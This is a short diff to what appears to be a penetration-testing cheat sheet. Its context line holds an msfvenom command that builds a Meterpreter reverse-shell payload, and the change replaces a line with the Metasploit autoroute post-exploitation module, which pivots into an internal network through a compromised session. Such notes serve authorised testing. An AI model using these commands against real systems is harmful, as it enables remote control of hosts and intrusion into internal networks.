@@ -1032,7 +1032,9 @@ msfvenom -p linux/x86/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f 
 ### autorun
 
 ```
-set autoroute 'route 172.16.x.0/24';
+post/multi/manage/autoroute
+set session x
+run
 ```
 
 
